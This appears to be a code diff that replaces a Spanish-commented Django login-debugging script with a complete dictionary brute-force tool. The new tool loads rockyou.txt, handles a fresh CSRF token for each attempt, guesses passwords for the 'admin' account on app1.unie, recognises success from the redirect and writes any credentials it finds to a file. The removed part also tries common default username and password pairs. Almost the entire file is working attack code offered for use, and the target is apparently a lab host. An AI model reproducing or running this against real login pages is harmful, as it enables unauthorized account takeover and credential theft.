@@ -1,163 +1,161 @@
 #!/usr/bin/env python3
 import requests
-import re
+from bs4 import BeautifulSoup
+import time
 
-def deep_debug_login():
-    base_url = "http://app1.unie"
-    login_url = f"{base_url}/users/login/"
-    
-    print("🔍 DEBUG PROFUNDO - Analizando respuestas del servidor\n")
-    
-    session = requests.Session()
-    
-    # 1. Primero obtener la página normalmente
-    print("1. Obteniendo página de login...")
-    get_response = session.get(login_url)
-    print(f"   GET Status: {get_response.status_code}")
-    print(f"   GET Cookies: {session.cookies.get_dict()}")
-    
-    # Extraer CSRF
-    csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response.text)
-    csrf_token = csrf_match.group(1) if csrf_match else "NO_ENCONTRADO"
-    print(f"   CSRF Token: {csrf_token}")
-    
-    # 2. Probar con contraseña vacía
-    print("\n2. Probando con contraseña VACÍA...")
-    data_empty = {
-        'username': 'admin',
-        'password': '',
-        'csrfmiddlewaretoken': csrf_token,
-        'next': ''
-    }
-    response_empty = session.post(login_url, data=data_empty, allow_redirects=False)
-    print(f"   Status: {response_empty.status_code}")
-    print(f"   Headers: {dict(response_empty.headers)}")
-    print(f"   Cookies después: {session.cookies.get_dict()}")
-    
-    # 3. Probar con contraseña incorrecta
-    print("\n3. Probando con contraseña INCORRECTA...")
-    session2 = requests.Session()  # Nueva sesión
-    get_response2 = session2.get(login_url)
-    csrf_match2 = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response2.text)
-    csrf_token2 = csrf_match2.group(1) if csrf_match2 else "NO_ENCONTRADO"
-    
-    data_wrong = {
-        'username': 'admin',
-        'password': 'ESTACONTRASEÑAESINCORRECTA12345',
-        'csrfmiddlewaretoken': csrf_token2,
-        'next': ''
-    }
-    response_wrong = session2.post(login_url, data=data_wrong, allow_redirects=False)
-    print(f"   Status: {response_wrong.status_code}")
-    print(f"   Headers: {dict(response_wrong.headers)}")
-    print(f"   Cookies después: {session2.cookies.get_dict()}")
-    
-    # 4. Probar con usuario que no existe
-    print("\n4. Probando con usuario INEXISTENTE...")
-    session3 = requests.Session()  # Nueva sesión
-    get_response3 = session3.get(login_url)
-    csrf_match3 = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response3.text)
-    csrf_token3 = csrf_match3.group(1) if csrf_match3 else "NO_ENCONTRADO"
-    
-    data_fake_user = {
-        'username': 'USUARIOQUENOEXISTE12345',
-        'password': 'cualquierpassword',
-        'csrfmiddlewaretoken': csrf_token3,
-        'next': ''
-    }
-    response_fake = session3.post(login_url, data=data_fake_user, allow_redirects=False)
-    print(f"   Status: {response_fake.status_code}")
-    print(f"   Headers: {dict(response_fake.headers)}")
-    print(f"   Cookies después: {session3.cookies.get_dict()}")
-    
-    # 5. Analizar diferencias en las respuestas
-    print("\n5. Analizando contenido de respuestas...")
-    
-    print(f"   Respuesta vacía length: {len(response_empty.text)}")
-    print(f"   Respuesta incorrecta length: {len(response_wrong.text)}")
-    print(f"   Respuesta usuario fake length: {len(response_fake.text)}")
-    
-    # Buscar mensajes de error específicos
-    error_patterns = [
-        'invalid', 'incorrect', 'error', 'failed', 'success', 
-        'logged in', 'bienvenido', 'welcome'
-    ]
-    
-    for pattern in error_patterns:
-        if pattern in response_empty.text.lower():
-            print(f"   '{pattern}' en respuesta vacía: SÍ")
-        if pattern in response_wrong.text.lower():
-            print(f"   '{pattern}' en respuesta incorrecta: SÍ")
-        if pattern in response_fake.text.lower():
-            print(f"   '{pattern}' en respuesta usuario fake: SÍ")
+def brute_force_django_admin(password_file="rockyou.txt", target_url="http://app1.unie/admin/login/"):
 
-def test_specific_scenarios():
-    """Probar escenarios específicos"""
-    base_url = "http://app1.unie"
-    login_url = f"{base_url}/users/login/"
-    
-    print("\n🎯 PROBANDO ESCENARIOS ESPECÍFICOS\n")
-    
-    scenarios = [
-        {"username": "admin", "password": "admin", "desc": "Admin con admin"},
-        {"username": "admin", "password": "password", "desc": "Admin con password"},
-        {"username": "admin", "password": "123456", "desc": "Admin con 123456"},
-        {"username": "test", "password": "test", "desc": "Test con test"},
-        {"username": "root", "password": "root", "desc": "Root con root"},
-    ]
-    
-    for scenario in scenarios:
-        session = requests.Session()
+    # Realiza fuerza bruta contra el panel de administración de Django
+    try:
+        # Leer el archivo de contraseñas
+        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
+            passwords = [line.strip() for line in f]
         
-        try:
-            # Obtener CSRF
-            get_response = session.get(login_url)
-            csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response.text)
-            if not csrf_match:
-                print(f"❌ {scenario['desc']}: No CSRF")
-                continue
+        print(f"[*] Cargadas {len(passwords)} contraseñas desde {password_file}")
+        print(f"[*] Objetivo: {target_url}")
+        print(f"[*] Usuario probado: admin")
+        print("-" * 50)
+        
+        success = False
+        tested = 0
+        
+        for password in passwords:
+            tested += 1
             
-            csrf_token = csrf_match.group(1)
+            # Mostrar progreso cada 100 intentos
+            if tested % 100 == 0:
+                print(f"[*] Progreso: {tested}/{len(passwords)} intentos")
             
-            # Login
-            data = {
-                'username': scenario['username'],
-                'password': scenario['password'],
-                'csrfmiddlewaretoken': csrf_token,
-                'next': ''
-            }
+            # Crear nueva sesión para cada intento (importante para CSRF)
+            session = requests.Session()
             
-            # Probar con y sin redirección
-            response_no_redirect = session.post(login_url, data=data, allow_redirects=False)
-            response_with_redirect = session.post(login_url, data=data, allow_redirects=True)
-            
-            print(f"🔍 {scenario['desc']}:")
-            print(f"   Sin redirección: {response_no_redirect.status_code}")
-            print(f"   Con redirección: {response_with_redirect.status_code}")
-            print(f"   URL final: {response_with_redirect.url}")
-            
-            # Verificar si estamos en una página diferente al login
-            if 'login' not in response_with_redirect.url:
-                print(f"   ✅ POSIBLE ÉXITO - No está en página de login")
-            else:
-                print(f"   ❌ Sigue en login")
+            try:
+                # 1. Obtener página de login y token CSRF
+                print(f"[{tested}] Probando: '{password}'", end="", flush=True)
                 
-        except Exception as e:
-            print(f"❌ {scenario['desc']}: Error - {e}")
+                response = session.get(target_url, timeout=10)
+                
+                if response.status_code != 200:
+                    print(f" -> Error HTTP {response.status_code}")
+                    continue
+                
+                soup = BeautifulSoup(response.text, 'html.parser')
+                csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
+                
+                if not csrf_input:
+                    print(" -> No se encontró token CSRF")
+                    continue
+                
+                csrf_token = csrf_input['value']
+                
+                # 2. Intentar login
+                login_data = {
+                    'csrfmiddlewaretoken': csrf_token,
+                    'username': 'admin',
+                    'password': password,
+                    'next': '/admin/'
+                }
+                
+                headers = {
+                    'Referer': target_url,
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+                }
+                
+                response = session.post(
+                    target_url, 
+                    data=login_data, 
+                    headers=headers, 
+                    allow_redirects=False,
+                    timeout=10
+                )
+                
+                # 3. Verificar resultado
+                if response.status_code == 302:
+                    location = response.headers.get('Location', '')
+                    if '/admin/' in location and 'login' not in location:
+                        print(f" -> ¡ÉXITO! Contraseña encontrada: {password}")
+                        print("-" * 50)
+                        print("[+] ==============================================")
+                        print(f"[+] CREDENCIALES ENCONTRADAS: admin:{password}")
+                        print("[+] ==============================================")
+                        
+                        # Guardar resultado en archivo
+                        with open("credenciales_encontradas.txt", "w") as f:
+                            f.write(f"URL: {target_url}\n")
+                            f.write(f"Usuario: admin\n")
+                            f.write(f"Contraseña: {password}\n")
+                        
+                        success = True
+                        break
+                    else:
+                        print(" -> Falló (redirección a login)")
+                else:
+                    # Buscar mensajes de error comunes
+                    if "Please enter the correct" in response.text:
+                        print(" -> Incorrecta")
+                    elif "CSRF" in response.text:
+                        print(" -> Error CSRF")
+                    else:
+                        print(f" -> Código HTTP: {response.status_code}")
+                
+                # Pequeña pausa para evitar bloqueos
+                time.sleep(0.1)
+                
+            except requests.exceptions.Timeout:
+                print(f" -> Timeout")
+                time.sleep(1)
+            except requests.exceptions.ConnectionError:
+                print(f" -> Error de conexión")
+                time.sleep(2)
+            except Exception as e:
+                print(f" -> Error: {str(e)[:30]}")
+        
+        if not success:
+            print("\n[-] No se encontró la contraseña en el diccionario")
+            
+    except FileNotFoundError:
+        print(f"[!] Error: No se encontró el archivo {password_file}")
+        print("[!] Puedes descargar rockyou.txt desde:")
+        print("[!] https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
+        print("[!] O crear uno manual: echo 'admin' > passwords.txt")
+    except KeyboardInterrupt:
+        print("\n[!] Interrumpido por el usuario")
+    except Exception as e:
+        print(f"[!] Error inesperado: {e}")
+
+def main():
+    print("____             _         _____                  \n| __ ) _ __ _   _| |_ ___  |  ___|__  _ __ ___ ___ \n|  _ \\| '__| | | | __/ _ \\ | |_ / _ \\| '__/ __/ _ \\\n| |_) | |  | |_| | ||  __/ |  _| (_) | | | (_|  __/\n|____/|_|   \\__,_|\\__\\___| |_|  \\___/|_|  \\___\\___|")
+    print(" ___           ___ ___ ___ ___ \n| __|__ _ _   / __/ __| _ \\ __|\n| _/ _ \\ '_| | (__\\__ \\   / _| \n|_|\\___/_|    \\___|___/_|_\\_|  \n                               \n")
+    # Configuración
+    password_file = "rockyou.txt"  # Cambia si está en otra ruta
+    target_url = "http://app1.unie/users/login/"
+    #target_url = "http://app1.unie/admin/login/"
+    
+    # Verificar si el archivo existe
+    import os
+    if not os.path.exists(password_file):
+        print(f"[!] Archivo {password_file} no encontrado")
+        
+    
+    print("[*] Iniciando ataque de fuerza bruta...")
+    print("[*] Presiona Ctrl+C para detener")
+    print("")
+    
+    # Iniciar ataque
+    brute_force_django_admin(password_file, target_url)
+    
+    print("\n[*] Ejecución completada")
 
 if __name__ == "__main__":
-    print("=" * 70)
-    print("DEBUG COMPLETO - ENTENDIENDO EL COMPORTAMIENTO DEL LOGIN")
-    print("=" * 70)
+    # Instalar dependencias si es necesario
+    try:
+        import requests
+        from bs4 import BeautifulSoup
+    except ImportError:
+        print("[!] Instalando dependencias necesarias...")
+        import subprocess
+        subprocess.check_call(["pip", "install", "requests", "beautifulsoup4"])
+        print("[*] Dependencias instaladas, ejecuta de nuevo el script")
+        exit()
     
-    deep_debug_login()
-    test_specific_scenarios()
-    
-    print("\n" + "=" * 70)
-    print("CONCLUSIÓN:")
-    print("Si TODAS las contraseñas dan Status 500, hay varias posibilidades:")
-    print("1. El servidor tiene un error interno constante")
-    print("2. Hay un problema con la aplicación Django")
-    print("3. Necesitamos un criterio de detección diferente")
-    print("4. La autenticación funciona de forma diferente")
-    print("=" * 70)
+    main()
